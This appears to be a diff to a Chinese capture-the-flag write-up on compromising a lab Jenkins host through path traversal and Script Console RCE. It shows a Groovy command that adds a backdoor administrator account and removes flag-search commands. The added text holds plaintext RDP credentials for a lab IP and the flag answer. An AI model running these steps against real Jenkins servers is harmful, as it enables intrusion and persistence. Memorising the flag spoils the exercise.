@@ -73,7 +73,7 @@ if ( file_exists( $logfile ) ) {
 exit;
 ```
 
-**：** 该脚本直接接收 `logfile` 参数并通过 `file_get_contents()` 读取文件内容，未对路径做任何过滤限制。攻击者可以通过 `../` 目录穿越读取服务器上的任意文件。
+**漏洞分析：** 该脚本直接接收 `logfile` 参数并通过 `file_get_contents()` 读取文件内容，未对路径做任何过滤限制。攻击者可以通过 `../` 目录穿越读取服务器上的任意文件。
 
 ### 2.2 读取Jenkins初始管理员密码
 
@@ -138,6 +138,8 @@ curl -s -b /tmp/jenkins_jar.txt \
 
 **输出：`nt authority\system`** — Jenkins以SYSTEM权限运行。
 
+
+![](assets/file-20260709143848667.png)
 ### 4.4 创建管理员用户
 
 通过Groovy命令执行添加用户并加入Administrators组：
@@ -155,34 +157,19 @@ println "net localgroup administrators Z3r4y /add".execute().text
 
 用户 `Z3r4y` 已创建并加入 Administrators 组。
 
-### 4.5 搜索并读取Flag
-
-搜索flag文件：
-
-```groovy
-println 'cmd /c dir /s /b C:\flag*.txt C:\*flag*.txt 2>nul'.execute().text
-```
-
-发现flag文件位于：`C:\Users\Administrator\flag\flag01.txt`
-
-读取flag：
-
-```groovy
-println 'cmd /c type C:\Users\Administrator\flag\flag01.txt'.execute().text
-```
-
 ## 五、获取Flag
 
-```
-                                 _         _       _   _
-                                | |       | |     | | (_)
-  ___ ___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_ _  ___  _ __  ___
- / __/ _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
-| (_| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
- \___\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
-                  __/ |
-                 |___/
+利用刚才创建的用户名和密码 rpd远程登录**39.100.181.54**
 
+```
+ip: 39.100.181.54
+user: Z3r4y
+password: 0x401@admin
+```
+
+![](assets/file-20260709145056164.png)
+
+```
 flag01: flag{75dc8198-df19-4db3-a0af-0973e50d3201}
 ```
 
@@ -194,13 +181,17 @@ flag01: flag{75dc8198-df19-4db3-a0af-0973e50d3201}
 → 创建管理员用户 → 读取flag01
 ```
 
-| 步骤 | 漏洞/技术 | 关键资产 | 说明 |
-|------|-----------|----------|------|
-| 1 | 源码泄露 | www.zip | 备份文件可直接下载 |
-| 2 | 任意文件读取 | content-log.php | logfile参数无过滤，路径穿越读取任意文件 |
-| 3 | 凭据泄露 | initialAdminPassword | 读取到Jenkins初始管理员密码 |
-| 4 | Jenkins RCE | Script Console | Groovy脚本执行系统命令，获得SYSTEM权限 |
-| 5 | 权限维持 | 创建管理员用户 | net user添加用户，便于后续RDP登录 |
+| 步骤  | 漏洞/技术       | 关键资产                 | 说明                        |
+| --- | ----------- | -------------------- | ------------------------- |
+| 1   | 源码泄露        | www.zip              | 备份文件可直接下载                 |
+| 2   | 任意文件读取      | content-log.php      | logfile参数无过滤，路径穿越读取任意文件   |
+| 3   | 凭据泄露        | initialAdminPassword | 读取到Jenkins初始管理员密码         |
+| 4   | Jenkins RCE | Script Console       | Groovy脚本执行系统命令，获得SYSTEM权限 |
+| 5   | 权限维持        | 创建管理员用户              | net user添加用户，便于后续RDP登录    |
 
 ---
 
+
+
+关卡剧情：
+管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。
